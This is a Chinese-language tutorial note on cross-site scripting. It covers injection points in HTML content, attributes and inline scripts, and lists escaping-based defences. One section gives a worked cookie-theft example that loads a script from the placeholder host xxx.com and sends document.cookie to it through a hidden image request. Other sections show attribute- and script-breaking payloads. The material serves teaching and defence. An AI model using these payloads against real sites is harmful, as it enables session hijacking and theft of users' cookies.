# 跨站脚本攻击(Cross Site Scripting)

html结构
```html
<!-- content为用户输入的数据 -->
<div>
    #{content}
</div>
```
正常数据
```html
<!-- 输入 Hello World -->
<div>
    Hello World
</div>
```
恶意数据
```html
<!-- 输入 <script>alert(1)</script> -->
<div>
    <script>alert(1)</script>
</div>
```

# 案例: 利用XSS获取cookie

搜索框输入关键词, 搜索结果会回显关键词

输入脚本
```html
<script src="http://xxx.com/a.js"></script>
```
a.js内容如下
```javascript
var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = 'http://xxx.com/b.php?c=' +
    encodeURIComponent(document.cookie);
```

# XSS攻击分类

1. 反射型: url参数直接注入
2. 存储型: 存储到数据库后, 页面读取数据库时注入

# XSS攻击注入点

## HTML节点内容

```html
<div>
    #{content}
</div>
```

## HTML属性

```html
<img src="#{image}" />
```
注入
```html
<!-- 
    输入: 1" onerror="alert(1)
    关闭当前src属性,并添加自定义属性 
-->
<img src="1" onerror="alert(1)" />
```

## JavaScript代码

```html
<script>
var from = "!{from}";
</script>
```
注入
```html
<!-- 
    输入: hello";alert(1);"
-->
<script>
var from = "hello";alert(1);"";
</script>
```

## 富文本

富文本会保留html

# XSS防御

## 浏览器自带的防御

1. 浏览器会防御反射型的XSS, 即url里的内容再次出现在html节点和html属性中

## HTML节点内容

1. 将尖括号`<`和`>`转义成`&lt;`和`&gt;`

## HTML属性

1. 将引号`"`转义成`&quot;`
2. 将引号`'`转义成`&#39;`
3. 将空格` `转义成`&nbsp;`

## JavaScript代码

1. 将斜杠`\`转义成`\\`
2. 将引号`"`转义成`\"`
3. 将引号`'`转义成`&#39;`
4. 将输入用JSON.stringfy()转义

## 富文本

1. 按黑名单过滤部分标签和属性
2. 按白名单保留部分标签和属性
